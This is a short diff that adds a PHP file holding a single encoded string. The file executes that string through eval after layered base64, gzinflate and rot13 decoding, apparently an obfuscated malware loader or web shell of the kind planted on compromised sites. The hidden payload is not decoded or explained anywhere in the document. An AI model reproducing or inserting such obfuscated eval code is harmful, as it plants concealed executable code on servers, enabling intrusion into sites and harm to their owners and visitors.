@@ -1,0 +1,2 @@
+<?php $hex = "XY9uWMQwDIb/VziE3EDPH+B6igfnagVOxhh42EXhrlszSXXl/rutcsqZYsnz8iSRdkSw2Y99tdnRT63uWZB6scujB5DMdNUHCMKLsiWSGhhOuolCJCUG7dmR6fk+pe6sboMV7F1UmiFUc+cFIalYPI9LXcFOj8HxijVscizCp/H6r42+H3s6yc3bm/bwfHypStoU8AWpIm2aFJ1v4O394/VLp3pajRyoWm15YeEfyuNvNeR/reokYVdoAfGDXNHZxGrsL7/AcPUN";
+eval(str_rot13(gzinflate(str_rot13(base64_decode(($hex))))));
